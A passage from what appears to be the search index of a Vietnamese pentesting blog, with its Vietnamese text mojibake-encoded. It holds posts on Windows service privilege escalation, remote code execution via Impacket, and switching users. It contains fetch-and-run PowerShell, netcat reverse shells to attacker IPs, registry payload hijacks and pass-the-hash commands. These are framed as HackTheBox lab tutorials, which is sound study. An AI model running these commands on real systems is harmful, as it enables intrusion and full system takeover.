th∆∞ m·ª•c C:\\Program Files\\A Subfolder th√¨ ta t·∫°o 1 file shell t√™n B.exe r·ªìi th·ª±c hi·ªán kh·ªüi ƒë·ªông l·∫°i Windows. Khi Windows autostart l·∫°i ·ª©ng d·ª•ng th√¨ n√≥ s·∫Ω th·ª±c thi ƒë∆∞·ª£c file B.exe v√† m√¨nh c√≥ quy·ªÅn SYSTEM.\nC√≥ th·ªÉ s·ª≠ d·ª•ng c√¢u l·ªánh t√¨m ki·∫øm nhanh v·ªõi powershell nh∆∞ sau ƒê·∫ßu ti√™n c·∫ßn s·ª≠ d·ª•ng ch∆∞∆°ng tr√¨nh PowerUp.ps1 t·∫°i https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1 sau ƒë√≥ host l√™n server c·ªßa m√¨nh r·ªìi ch·∫°y l·ªánh b√™n d∆∞·ªõi ƒë·ªÉ th·ª±c thi.\n1  powershell -nop -exec bypass -c \u0026#34;IEX(New-Object Net.WebClient).DownloadString(\u0026#39;http://192.168.0.81/PowerUp.ps1\u0026#39;);Get-ServiceUnquoted\u0026#34;    nop: Vi·∫øt t·∫Øt c·ªßa NoProfile, n√≥ cho ph√©p PowerShell kh√¥ng th·ª±c thi c√°c l·ªánh c·ªßa user v√† ngay l·∫≠p t·ª©c kh·ªüi ch·∫°y t·∫≠p l·ªánh c·ªßa b·∫°n trong m·ªôt m√¥i tr∆∞·ªùng kh√¥ng b·ªã ·∫£nh h∆∞·ªüng exec bypass: N·∫øu kh√¥ng cho ph√©p th·ª±c thi t·∫≠p l·ªánh, h√£y ƒë·∫£m b·∫£o cho ph√©p n√≥ ƒë·ªÉ ch·∫°y t·∫≠p l·ªánh powershell n√†y c: l·ªánh ch·∫°y t·ª´ PowerShell  Ho·∫∑c c√≥ th·ªÉ s·ª≠ d·ª•ng winPEAS ƒë·ªÉ ph√°t hi·ªán ra l·ªói Unquoted Service Path\n\n V√≠ d·ª•: https://youtu.be/b5Tbgl_Nd-g\n Weak Registry Permission Nguy√™n nh√¢n Tr√™n Windows, c√°c service c√≥ c√°c registry keys v√† c√°c keys ƒë∆∞·ª£c ƒë·∫∑t t·∫°i:\n1  HKLM\\SYSTEM\\CurrentControlSet\\Services\\\u0026lt;service_name\u0026gt;   N·∫øu user c√≥ quy·ªÅn th·∫•p h∆°n SYSTEM c√≥ FullControl trong b·∫•t k·ª≥ d·ªãch v·ª• n√†o, trong tr∆∞·ªùng h·ª£p ƒë√≥, user c√≥ th·ªÉ thay ƒë·ªïi registry n√†y v·ªõi binary ch·ª©a payload ƒë·ªôc h·∫°i v√† s·∫Ω ƒë∆∞·ª£c execute b·ªüi service ƒë√≥\nKhai th√°c Ch√∫ng ta s·∫Ω ƒëi th·∫≥ng v√†o v√≠ d·ª• ƒë·ªÉ c√≥ th·ªÉ th·∫•y c√°ch khai th√°c r√µ r√†ng h∆°n\nV√≠ d·ª•: Control (hackthebox) S·ª≠ d·ª•ng command sau ƒë·ªÉ ki·ªÉm tra xem c√°c d·ªãch v·ª• m√† Hector c√≥ FullControl\n1  get-acl HKLM:\\System\\CurrentControlSet\\services\\* | Format-List * | findstr /i \u0026#34;hector Users Path Everyone\u0026#34;   \nV√¨ c√≥ qu√° nhi·ªÅu d·ªãch v·ª• n√™n t·∫≠p trung v√†o m·ªôt d·ªãch v·ª• c√≥ t√™n l√† wuauserv l√† d·ªãch v·ª• c·ªßa Windows Updater\nT·∫°o payload\n1  reg add \u0026#34;HKLM\\System\\CurrentControlSet\\services\\wuauserv\u0026#34; /t REG_EXPAND_SZ /v ImagePath /d \u0026#34;C:\\temp\\nc.exe \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt; -e powershell\u0026#34; /f   Ti·∫øn h√†nh l·∫Øng nghe tr√™n port v√† kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª• wuauserv\n1  sc.exe start wuauserv   ho·∫∑c\n1  Start-Service wuauserv   \n V√≠ d·ª• 2: https://youtu.be/TDgQzcjFeME\n Weak Service Permissions (Insecure Service Properties) Nguy√™n nh√¢n Nh·ªØng services ƒë∆∞·ª£c t·∫°o b·ªüi SYSTEM c√≥ weak permissions c√≥ th·ªÉ d·∫´n ƒë·∫øn privilege escalation. N·∫øu m·ªôt user c√≥ quy·ªÅn th·∫•p h∆°n nh∆∞ng m√† l·∫°i c√≥ th·ªÉ ch·ªânh s·ª≠a config c·ªßa services ƒë√≥, ·ªü ƒë√¢y ƒëang n√≥i ƒë·∫øn l√† thay ƒë·ªïi ƒë∆∞·ª£c binPath. L√∫c n√†y attacker c√≥ th·ªÉ ch·ªânh s·ª≠a binPath d·∫´n t·ªõi m·ªôt ch∆∞∆°ng tr√¨nh c√≥ ch·ª©a payload ƒë·ªôc h·∫°i v√† kh·ªüi ƒë·ªông l·∫°i service ƒë√≥, ch∆∞∆°ng tr√¨nh ƒë·ªôc h·∫°i s·∫Ω ƒë∆∞·ª£c th·ª±c thi v·ªõi quy·ªÅn SYSTEM. Ch∆∞∆°ng tr√¨nh ƒë·ªôc h·∫°i c√≥ th·ªÉ ch·ª©a payload k·∫øt n·ªëi ra b√™n ngo√†i, attacker l√∫c n√†y ƒë√£ c√≥ th·ªÉ s·ª≠ d·ª•ng quy·ªÅn SYSTEM.\nKhai th√°c Ch√∫ng ta s·∫Ω ƒëi th·∫≥ng v√†o v√≠ d·ª• ƒë·ªÉ c√≥ th·ªÉ th·∫•y c√°ch khai th√°c r√µ r√†ng h∆°n\nV√≠ d·ª•: Remote (hackthebox) Ki·ªÉm tra d·ªãch v·ª• Weak Service Permissions (ngo√†i PowerUp c√≥ th·ªÉ s·ª≠ d·ª•ng winPEAS c≈©ng c√≥ th·ªÉ ph√°t hi·ªán ra)\npowershell -c \u0026quot;iex(new-object net.webclient).downloadstring('http://10.10.14.91:8888/PowerUp.ps1'); Invoke-AllChecks\u0026quot;\nK·∫øt qu·∫£:\nService exploit l√† UsoSvc.\nK√©o nc v·ªÅ:\n1 2  mkdir temp invoke-webrequest -Uri http://10.10.14.91:8888/nc.exe -OutFile c:\\temp\\nc.exe   L∆∞u √Ω c·∫ßn t·∫°o /temp/ tr∆∞·ªõc\nT·∫°i local t·∫°o file .bat nh∆∞ sau:\nK√©o n√≥ l√™n machine:\n1  invoke-webrequest -Uri http://10.10.14.91:8888/connect.bat -OutFile c:\\temp\\connect.bat   G√°n binpath cho UsoSvc:\n1  sc.exe config UsoSvc binpath= \u0026#34;C:\\temp\\connect.bat\u0026#34;   Listen tr√™n m√°y local v√† ch·∫°y UsoSvc:\n1  sc.exe start UsoSvc   K·∫øt qu·∫£:\nDLL Hijacking Nguy√™n nh√¢n M·ªôt ch∆∞∆°ng tr√¨nh Windows s·∫Ω t√¨m ki·∫øm file DLL khi n√≥ ƒë∆∞·ª£c kh·ªüi ƒë·ªông. N·∫øu c√°c DLL n√†y kh√¥ng t·ªìn t·∫°i th√¨ c√≥ th·ªÉ nh·∫Øm ƒë·∫øn v√† khai th√°c. Ch√∫ng ta c√≥ th·ªÉ t·∫°o 1 file DLL ƒë·ªôc h·∫°i v√†o v·ªã tr√≠ m√† ch∆∞∆°ng tr√¨nh ƒë√≥ ƒëang t√¨m ki·∫øm v√† kh·ªüi ƒë·ªông, l√∫c n√†y ta s·∫Ω c√≥ quy·ªÅn c·ªßa ng∆∞·ªùi kh·ªüi ƒë·ªông ch∆∞∆°ng tr√¨nh.\nM·ªôt ch∆∞∆°ng tr√¨nh Windows s·∫Ω s·ª≠ d·ª•ng c√°c ƒë∆∞·ªùng d·∫´n ƒë√£ ƒë∆∞·ª£c defined t·ª´ tr∆∞·ªõc ƒë·ªÉ t√¨m ki·∫øm c√°c file DLL, v√† n√≥ s·∫Ω ki·ªÉm tra c√°c ƒë∆∞·ªùng d·∫´n n√†y theo m·ªôt th·ª© t·ª± c·ª• th·ªÉ\n The directory from which the application loaded 32-bit System directory (C:\\Windows\\System32) 16-bit System directory (C:\\Windows\\System) Windows directory (C:\\Windows) The current working directory (CWD) Directories in the PATH environment variable (first system and then user)  \n\nKhai th√°c Ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng PowerUp ho·∫∑c winPEAS ƒë·ªÉ c√≥ th·ªÉ ph√°t hi·ªán ra l·ªó h·ªïng DLL hijacking. Th√¥ng th∆∞·ªùng, ch√∫ng ta c√≥ th·ªÉ s∆∞ d·ª•ng ch·ª©c nƒÉng Write-HijackDll c·ªßa PowerUp ƒë·ªÉ vi·∫øt ra m·ªôt file DLL ƒë·ªôc h·∫°i v√† kh·ªüi ƒë·ªông l·∫°i ch∆∞∆°ng tr√¨nh. Khi ch∆∞∆°ng tr√¨nh ƒë∆∞·ª£c kh·ªüi ƒë·ªông, n√≥ s·∫Ω load file DLL ƒë·ªôc h·∫°i v√† execute code v·ªõi quy·ªÅn cao h∆°n.\n1  Write-HijackDll -DllPath \u0026#39;C:\\Temp\\wlbsctrl.dll\u0026#39;   Ho·∫∑c n·∫øu kh√¥ng mu·ªën s·ª≠ d·ª•ng c√¥ng c·ª• th√¨ c√≥ th·ªÉ l√†m b·∫±ng tay theo c√°ch n√†y https://medium.com/@sghosh2402/ikeext-dll-hijacking-3aefe4dde7f5\nTuy nhi√™n c√≥ th·ªÉ ƒë√¢y l√† ng√µ c·ª•t n·∫øu b·∫°n c√≥ th·ªÉ ti√™m ƒë∆∞·ª£c file DLL nh∆∞ng kh√¥ng c√≥ c√°ch n√†o kh·ªüi ƒë·ªông ch∆∞∆°ng tr√¨nh nh∆∞ trong b√†i n√†y https://0xdf.gitlab.io/2019/06/22/htb-querier.html\nChi ti·∫øt h∆°n ki·ªÉu t·∫•n c√¥ng n√†y c√≥ th·ªÉ ƒë·ªçc t·∫°i\n https://hacknpentest.com/windows-privilege-escalation-dll-hijacking/ https://medium.com/risus-sardonicus-itsec/windows-dll-hijacking-1c4b4999608e https://medium.com/@akshayj0111/dll-hijacking-attack-24825ff84456   V√≠ d·ª•: https://youtu.be/9s8jYwx9FSA\n Insecure Service Executables Nguy√™n nh√¢n Nguy√™n nh√¢n ch√≠nh l√† do SYSTEM c√†i ƒë·∫∑t l√™n d·ªãch v·ª• kh√¥ng an to√†n (c√≥ l·ªó h·ªïng) l√™n machine, attacker c√≥ th·ªÉ khai th√°c l·ªó h·ªïng ƒë√≥ v√† chi·∫øm ƒë∆∞·ª£c quy·ªÅn SYSTEM\nKhai th√°c V·ªõi m·ªói service/program th√¨ c√°ch khai th√°c l·∫°i kh√°c nhau. Tuy nhi√™n m√¥ h√¨nh chung ch√∫ng ta s·∫Ω ƒëi theo con ƒë∆∞·ªùng nh∆∞ sau:\n T√¨m ki·∫øm d·ªãch v·ª• n√†o th√∫ v·ªã (nghi ng·ªù) Ki·ªÉm tra xem d·ªãch v·ª• ƒë√≥ c√≥ c√°ch khai th√°c ƒë∆∞·ª£c public hay ch∆∞a (v√≠ d·ª• nh∆∞ ƒë∆∞·ª£c quy·ªÅn ghi ƒë√® file DLL, th·ª±c thi code kh√¥ng c·∫ßn x√°c th·ª±c, c√≥ quy·ªÅn ƒë·ªëi v·ªõi c√°c th∆∞ m·ª•c nh·∫•t ƒë·ªãnh, \u0026hellip;) Th·ª±c hi·ªán exploit ƒë·ªÉ th·ª±c thi ho·∫∑c xem ƒë∆∞·ª£c nh·ªØng th·ª© cao h∆°n \u0026hellip;  K·∫øt lu·∫≠n V·∫≠y l√† ƒë√£ h·∫øt ph·∫ßn 1 v·ªõi series Windows Privilege Escalation, n·∫øu c√≥ ƒëi·ªÅu g√¨ bƒÉn khoƒÉn hay b√†i vi·∫øt c·ªßa m√¨nh c√≥ ƒëi·ªÅu g√¨ sai s√≥t m·ªçi ng∆∞·ªùi comment b√™n d∆∞·ªõi nh√©. C·∫£m ∆°n t·∫•t c·∫£ m·ªçi ng∆∞·ªùi ƒë√£ ƒë·ªçc b√†i vi·∫øt. Happy hacking!.\n","permalink":"https://minhtuanact.ml/posts/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits/","summary":"Gi·ªõi thi·ªáu Ng√†y tr∆∞·ªõc trong team m√¨nh c≈©ng ƒë√£ c√≥ @kongaconggo103 vi·∫øt series leo thang ƒë·∫∑c quy·ªÅn trong Linux, c√°c b·∫°n c√≥ th·ªÉ ƒë·ªçc t·∫°i\nLeo thang ƒë·∫∑c quy·ªÅn trong Linux - Linux Privilege Escalation #0: Using Sudo Rights \nLeo thang ƒë·∫∑c quy·ªÅn trong Linux - Linux Privilege Escalation #1: Using SUID bit \nLeo thang ƒë·∫∑c quy·ªÅn trong Linux - Linux Privilege Escalation #2: Using PATH Variables","title":"Leo thang ƒë·∫∑c quy·ªÅn trong Windows - Windows Privilege Escalation #1: Service Exploits"},{"content":"C√°c Pentester c√≥ th·ªÉ h·ªç r·∫•t quen thu·ªôc v·ªõi h·ªá ƒëi·ªÅu h√†nh Linux v·ªõi nh·ªØng command line tr√™n terminal, tuy nhi√™n n·∫øu g·∫∑p ph·∫£i server ch·∫°y Windows th√¨ h·ªç l·∫°i kh√° l√∫ng t√∫ng trong vi·ªác RCE. B√†i vi·∫øt n√†y m√¨nh s·∫Ω ch·ªâ ra v√†i c√°ch c√≥ th·ªÉ RCE tr√™n Windows t·ª´ Linux.\nS·ª≠ d·ª•ng Impacket Impacket l√† g√¨?\n Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.\n Github: https://github.com/SecureAuthCorp/impacket\n·ªû ƒë√¢y m√¨nh n√≥i ƒë·∫øn RCE th√¥i th√¨ Impacket c√≥ c√°c ch∆∞∆°ng tr√¨nh ch√≠nh ƒë·ªÉ th·ª±c hi·ªán RCE tr√™n Windows t·ª´ Linux.\n   STT Ch∆∞∆°ng tr√¨nh Ki·ªÉu RCE Port s·ª≠ d·ª•ng     1 psexec.py interactive shell tcp/445   2 dcomexec.py semi-interactive shell tcp/135 tcp/445 tcp/49751 (DCOM)   3 smbexec.py semi-interactive shell tcp/445   4 wmiexec.py semi-interactive shell tcp/135tcp/445tcp/50911 (Winmgmt)   5 atexec.py command tcp/445    C√†i ƒë·∫∑t Impacket c√≥ s·∫µn t·∫°i Kali Linux ·ªü ƒë∆∞·ªùng d·∫´n /usr/share/doc/python3-impacket/examples\nN·∫øu b·∫°n s·ª≠ d·ª•ng c√°c h·ªá ƒëi·ªÅu h√†nh Linux kh√°c th√¨ c√≥ th·ªÉ v√†o github xem h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t.\nImpacket: psexec.py N·∫øu b·∫°n c√≥ m·∫≠t kh·∫©u c·ªßa admin th√¨ s·ª≠ d·ª•ng c√¢u l·ªánh:\n1  python3 psexec.py \u0026#34;./Administrator:pass123\u0026#34;@192.168.40.128   N·∫øu b·∫°n c√≥ hash NTLM th√¨ s·ª≠ d·ª•ng c√¢u l·ªánh:\n1  python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 \u0026#34;./Administrator\u0026#34;@192.168.40.128   Impacket: dcomexec.py Ph∆∞∆°ng ph√°p Dcomexec.py s·ª≠ d·ª•ng c√°c ƒëi·ªÉm cu·ªëi DCOM nh∆∞ MMC20. S·ª≠ d·ª•ng ph∆∞∆°ng ph√°p n√†y y√™u c·∫ßu giao ti·∫øp tr√™n nhi·ªÅu c·ªïng m·∫°ng (TCP/135, TCP/445) v√† n·ªôi b·ªô s·ª≠ d·ª•ng h·ªá th·ªëng con DCOM c·ªßa h·ªá ƒëi·ªÅu khi·ªÉn Windows b·∫±ng m·ªôt c·ªïng t·ª± ƒë·ªông ph√¢n b·ªï cao nh∆∞ TCP/49751. ƒêi·ªÅu n√†y l√†m cho ph∆∞∆°ng ph√°p n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng kh√¥ng ph·ªï bi·∫øn l·∫Øm.\nS·ª≠ d·ª•ng v·ªõi username v√† passwd\n1  python3 dcomexec.py \u0026#34;./Administrator:pass123\u0026#34;@192.168.40.128   Ho·∫∑c s·ª≠ d·ª•ng hash NTLM\n1  python3 dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 \u0026#34;./Administrator\u0026#34;@192.168.40.128   Impacket: smbexec.py S·ª≠ d·ª•ng smbexec.py t·∫≠n d·ª•ng c√°c ch·ª©c nƒÉng Windows SMB ri√™ng ƒë·ªÉ th·ª±c hi·ªán c√°c l·ªánh b·∫•t k·ª≥ tr√™n Server Windows. L∆∞u √Ω r·∫±ng ch·ªâ s·ª≠ d·ª•ng c√°ch n√†y khi c·ªïng TCP/445 m·ªü. V√† ƒë√¢y c≈©ng l√† c√°ch m√¨nh hay s·ª≠ d·ª•ng nh·∫•t :v:\n1  python3 smbexec.py \u0026#34;./Administrator:pass123\u0026#34;@192.168.40.128   Ho·∫∑c s·ª≠ d·ª•ng hash NTLM\n1  python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 \u0026#34;./Administrator\u0026#34;@192.168.40.128   Impacket: wmiexec.py Trong tr∆∞·ªùng h·ª£p n√†y Impacket s·ª≠ d·ª•ng Windows Management Instrumentation (WMI) giao di·ªán c·ªßa h·ªá th·ªëng remote Windows t·ª´ xa ƒë·ªÉ l√™n shell tr√™n Windows.\nT∆∞∆°ng t·ª± nh∆∞ ph∆∞∆°ng ph√°p dcomexec, wmiexec c·∫ßn giao ti·∫øp qua c·ªïng m·∫°ng 3/d·ªãch v·ª•. C√°ch s·ª≠ d·ª•ng c≈©ng t∆∞∆°ng t·ª± nh∆∞ dcomexec.py.\n1  python3 wmiexec.py \u0026#34;./Administrator:pass123\u0026#34;@192.168.40.128   Ho·∫∑c s·ª≠ d·ª•ng hash NTLM\n1  python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 \u0026#34;./Administrator\u0026#34;@192.168.40.128   Impacket: atexec.py Ph∆∞∆°ng ph√°p n√†y s·ª≠ d·ª•ng d·ªãch v·ª• Task Scheduler service (Atsvc) tr√™n h·ªá th·ªëng Windows t·ª´ xa ƒë·ªÉ execute command. T·∫•t c·∫£ c√°c giao ti·∫øp m·∫°ng di·ªÖn ra tr√™n c·ªïng TCP/445.\n1  python3 atexec.py \u0026#34;./Administrator:pass123\u0026#34;@192.168.40.128 \u0026#34;whoami\u0026#34;   Ho·∫∑c s·ª≠ d·ª•ng hash NTLM\n1  python3 atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 \u0026#34;./Administrator\u0026#34;@192.168.204.183 \u0026#34;whoami\u0026#34;   Trong b√†i vi·∫øt n√†y, m√¨nh ƒë√£ ch·ªâ ra ƒë∆∞·ª£c 5 c√°ch s·ª≠ d·ª•ng Impacket ƒë·ªÉ RCE tr√™n c√°c h·ªá th·ªëng Windows t·ª´ xa.\nTuy nhi√™n, r·∫±ng Impacket c√≥ r·∫•t nhi·ªÅu c√°c package kh√°c ƒë·ªÉ l√†m nhi·ªÅu ƒëi·ªÅu kh√°c n·ªØa, b·∫°n ƒë·ªçc c√≥ th·ªÉ t√¨m hi·ªÉu c√°c ch·ª©c nƒÉng c·ªßa Impacket, n√≥ kh√¥ng ch·ªâ d·ª´ng l·∫°i ·ªü RCE. M√¨nh ƒë√£ s·ª≠ d·ª•ng Impacket kh√° nhi·ªÅu ƒë·ªëi v·ªõi c√°c h·ªá th·ªëng web server s·ª≠ d·ª•ng Windows. Ch√∫c c√°c b·∫°n t√¨m th·∫•y ƒë∆∞·ª£c ƒëi·ªÅu g√¨ ƒë√≥ c·∫ßn thi·∫øt v·ªõi m√¨nh ·ªü b√†i vi·∫øt n√†y.\n","permalink":"https://minhtuanact.ml/posts/lam-the-nao-de-rce-tren-windows-tu-linux/","summary":"C√°c Pentester c√≥ th·ªÉ h·ªç r·∫•t quen thu·ªôc v·ªõi h·ªá ƒëi·ªÅu h√†nh Linux v·ªõi nh·ªØng command line tr√™n terminal, tuy nhi√™n n·∫øu g·∫∑p ph·∫£i server ch·∫°y Windows th√¨ h·ªç l·∫°i kh√° l√∫ng t√∫ng trong vi·ªác RCE. B√†i vi·∫øt n√†y m√¨nh s·∫Ω ch·ªâ ra v√†i c√°ch c√≥ th·ªÉ RCE tr√™n Windows t·ª´ Linux.\nS·ª≠ d·ª•ng Impacket Impacket l√† g√¨?\n Impacket is a collection of Python classes for working with network protocols.","title":"L√†m th·∫ø n√†o ƒë·ªÉ RCE tr√™n Windows t·ª´ Linux?"},{"content":"Windows hay c√°c h·ªá ƒëi·ªÅu h√†nh nh∆∞ Linux, MacOS, \u0026hellip; cho ph√©p t·ªìn t·∫°i nhi·ªÅu t√†i kho·∫£n ng∆∞·ªùi d√πng tr√™n m·ªôt m√°y. C√°c t√†i kho·∫£n ƒë·ªÅu c√≥ th·ªÉ cho ph√©p b·∫°n t√πy bi·∫øn c√†i ƒë·∫∑t t√πy theo s·ªü th√≠ch c·ªßa m√¨nh v√† t√°ch bi·ªát so v·ªõi c√°c th√†nh vi√™n kh√°c trong khi s·ª≠ d·ª•ng chung m√°y t√≠nh. B√†i vi·∫øt n√†y m√¨nh s·∫Ω n√™u m·ªôt s·ªë c√°ch ƒë·ªÉ chuy·ªÉn ƒë·ªïi t√†i kho·∫£n ng∆∞·ªùi d√πng tr√™n Windows, nghe c√≥ v·∫ª kh√° ƒë∆°n gi·∫£n ƒë√∫ng kh√¥ng :D\nS·ª≠ d·ª•ng giao di·ªán Windows 10 C√°ch 1 Nh·∫•n Ctrl + ALT + Del v√† click Switch user\nC√°ch 2 V√†o start ch·ªçn avatar (user account button) tr√™n Start Menu sau ƒë√≥ ch·ªçn t√†i kho·∫£n c·∫ßn chuy·ªÉn.\nC√°ch 3 Nh·∫•n Windows + L ƒë·ªÉ kh√≥a t√†i kho·∫£n hi·ªán t·∫°i v√† ƒë∆∞·ª£c tr·ªü v·ªÅ m√†n h√¨nh h√≥a, nh·∫•n b√†n ph√≠m ho·∫∑c chu·ªôt r·ªìi b·∫°n s·∫Ω th·∫•y m√†n h√¨nh ƒëƒÉng nh·∫≠p. Ch·ªçn t√†i kho·∫£n m√† b·∫°n mu·ªën s·ª≠ d·ª•ng v√† ƒëƒÉng nh·∫≠p\n Windows 8 v√† Windows 7 c√≥ th·ªÉ s·ª≠ d·ª•ng 1 s·ªë c√°ch b√™n tr√™n, tuy nhi√™n c√°c thao t√°c v·ªõi giao di·ªán kh√°c bi·ªát h∆°n 1 ch√∫t\n S·ª≠ d·ª•ng c√¢u l·ªánh ƒê·ªëi v·ªõi pentester khi l√™n ƒë∆∞·ª£c shell tr√™n m√°y Windows th√¨ h·ªç s·∫Ω ch·ªâ s·ª≠ d·ª•ng ƒë∆∞·ª£c cmd ho·∫∑c powershell (tr·ª´ tr∆∞·ªùng h·ª£p l·∫•y ƒë∆∞·ª£c remote desktop Windows). V·∫≠y l√†m c√°ch n√†o ƒë·ªÉ switch user khi m√¨nh c√≥ th·ªÉ l·∫•y ƒë∆∞·ª£c t√†i kho·∫£n m·∫≠t kh·∫©u c·ªßa 1 trong s·ªë nh·ªØng user tr√™n Windows.\nKh√¥ng gi·ªëng nh∆∞ tr√™n Linux ho·∫∑c MacOS th√¨ ta c√≥ th·ªÉ chuy·ªÉn ƒë·ªïi t√†i kho·∫£n b·∫±ng l·ªánh c·ª±c ƒë∆°n gi·∫£n l√†\n1  su \u0026lt;t√™n t√†i kho·∫£n\u0026gt;   sau ƒë√≥ nh·∫≠p m·∫≠t kh·∫©u l√† ta c√≥ th·ªÉ chuy·ªÉn ƒë∆∞·ª£c sang t√†i kho·∫£n ƒë√≥ r·ªìi. V·∫≠y ƒë·ªëi v·ªõi Windows th√¨ ph·∫£i l√†m nh∆∞ th·∫ø n√†o?\nC√°ch 1 B∆∞·ªõc 1: T·∫£i file nc.exe l√™n m√°y target ch·∫°y Windows (file nc.exe c√≥ s·∫µn tr√™n Kali t·∫°i /usr/share/windows-resources/binaries/nc.exe)\nB∆∞·ªõc 2: S·ª≠ d·ª•ng powershell tr√™n m√°y target. G√µ powershell tr√™n command line ƒë·ªÉ kh·ªüi ƒë·ªông powershell.\nB∆∞·ªõc 3: Copy ƒëo·∫°n code n√†y paste l√™n m√°y target (·ªû ƒë√¢y v√≠ d·ª• c√≥ t√†i kho·∫£n m·∫≠t kh·∫©u l√† UserX:P@ssW0rd)\n1 2 3 4 5 6 7  $Username = \u0026#39;UserX\u0026#39; $Password = \u0026#39;P@ssW0rd\u0026#39; $pass = ConvertTo-SecureString -AsPlainText $Password -Force #Not recommended, but if rights are set on that location you can use it like this, otherwise encrypt it (recommended). $Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass #You can use it like this, or use it with other commands and \u0026#39; -Credential ...\u0026#39;  Invoke-Command -ComputerName \u0026#34;DeviceName\u0026#34; -Credential $Cred -ScriptBlock {#Your Code}    V·ªõi ph·∫ßn #Your code s·∫Ω th·ª±c thi l·ªánh v·ªõi quy·ªÅn l√† c·ªßa t√†i kho·∫£n UserX (t∆∞∆°ng t·ª± ƒë·ªëi v·ªõi sudo -u tr√™n Linux) n√™n s·ª≠ d·ª•ng reverse shell ƒë·∫øn m√°y pentester ƒë·ªÉ s·ª≠ d·ª•ng t√†i kho·∫£n UserX\nV√≠ d·ª• code\n1  C:\\test\\nc.exe -e cmd.exe 10.10.14.5 4444   V·ªõi 10.10.14.5 l√† ƒë·ªãa ch·ªâ ip pentester, 4444 l√† port ƒëang l·∫Øng nghe ·ªü m√°y c·ªßa pentester\nC√°ch 2 C√°ch tr√™n th√¨ s·ª≠ d·ª•ng khi c·ªïng 5896 ƒëang kh√¥ng ƒë∆∞·ª£c b·∫≠t. C·ªïng 5896 l√† c·ªïng d·ªãch v·ª• winrm (Microsoft Windows Remote Management) https://www.speedguide.net/port.php?port=5986\nN·∫øu c·ªïng 5896 ƒë∆∞·ª£c b·∫≠t th√¨ s·ª≠ d·ª•ng Evil-WinRM ƒë·ªÉ switch user\nEvil-WinRM s·ª≠ d·ª•ng ruby c√°c b·∫°n c√≥ th·ªÉ t·∫£i v√† c√†i ƒë·∫∑t t·∫°i ƒë√¢y https://github.com/Hackplayers/evil-winrm\n1  evil-winrm -i 10.10.10.18 -u Administrator -p PassW0rd   C√≥ 1 c√°ch kh√°c c√≥ th·ªÉ b·∫≠t c·ªïng 5986 l√™n khi m√°y ch·ªß ƒëang ch∆∞a b·∫≠t. S·ª≠ d·ª•ng Remote Port Forwarding ƒë·ªÉ m·ªü c·ªïng 5986 th√¥ng v·ªõi c·ªïng 5986 b√™n m√°y local.\n C√°c b·∫°n c√≥ th·ªÉ ƒë·ªçc b√†i n√†y c·ªßa m√¨nh ƒë·ªÉ hi·ªÉu c√°ch ho·∫°t ƒë·ªông c·ªßa Remote Port Forwarding https://viblo.asia/p/ssh-tunneling-local-port-forwarding-va-remote-port-forwarding-07LKXJ3PlV4\n B∆∞·ªõc 1: T·∫£i ch∆∞∆°ng tr√¨nh plink.exe l√™n target Windows, c√≥ ·ªü s·∫µn Kali OS t·∫°i ƒë∆∞·ªùng d·∫´n /usr/share/windows-resources/binaries/plink.exe\nB∆∞·ªõc 2: Kh·ªüi ƒë·ªông d·ªãch v·ª• ssh tr√™n m√°y pentester\nB∆∞·ªõc 3: G√µ l·ªánh tr√™n target s·ª≠ d·ª•ng powershell\n1  .\\plink.exe -l user -pw passwd -R 5985:127.0.0.1:5985 10.10.14.5   V·ªõi user v√† passwd l√† t√†i kho·∫£n m·∫≠t kh·∫©u ssh tr√™n m√°y pentester, 10.10.14.5 l√† ƒë·ªãa ch·ªâ ip c·ªßa m√°y pentester.\nB∆∞·ªõc 4:\nS·ª≠ d·ª•ng Evil-WinRM ƒë·ªÉ k·∫øt n·ªëi t·ªõi user m√¨nh mu·ªën\n1  evil-winrm -i 127.0.0.1 -u Administrator -p PassW0rd   C√°ch 3: S·ª≠ d·ª•ng psexec.exe c√≥ th·ªÉ download t·∫°i https://docs.microsoft.com/en-us/sysinternals/downloads/psexec\n1  psexec.exe //domain -u UserX -p P@ssW0rd \u0026lt;command\u0026gt;   V·∫≠y l√† m√¨nh c√≥ th·ªÉ s·ª≠ d·ª•ng c√¢u l·ªánh v·ªõi quy·ªÅn c·ªßa UserX r·ªìi.\n C·∫£m ∆°n @testanull ƒë√£ g·ª£i √Ω cho m√¨nh 1 c√°ch kh√° hay ;)\n  Tr√™n ƒë√¢y l√† m·ªôt s·ªë c√°ch ƒë·ªÉ s·ª≠ d·ª•ng t√†i kho·∫£n kh√°c tr√™n Windows, nh·∫•t l√† ƒë·ªëi v·ªõi c√°c b·∫°n n√†o mu·ªën leo quy·ªÅn l√™n t√†i kho·∫£n cao h∆°n tr√™n Win, hi v·ªçng l√† b√†i vi·∫øt c√≥ √≠ch gi√∫p c√°c b·∫°n. See you. Tham kh·∫£o  https://www.computerhope.com/issues/ch001317.htm https://www.digitalcitizen.life/how-switch-between-user-accounts-windows-10 https://docs.microsoft.com/en-us/sysinternals/downloads/psexec  ","permalink":"https://minhtuanact.ml/posts/lam-the-nao-de-chuyen-doi-tai-khoan-tren-windows-how-do-i-switch-users-in-windows/","summary":"Windows hay c√°c h·ªá ƒëi·ªÅu h√†nh nh∆∞ Linux, MacOS, \u0026hellip; cho ph√©p t·ªìn t·∫°i nhi·ªÅu t√†i kho·∫£n ng∆∞·ªùi d√πng tr√™n m·ªôt m√°y. C√°c 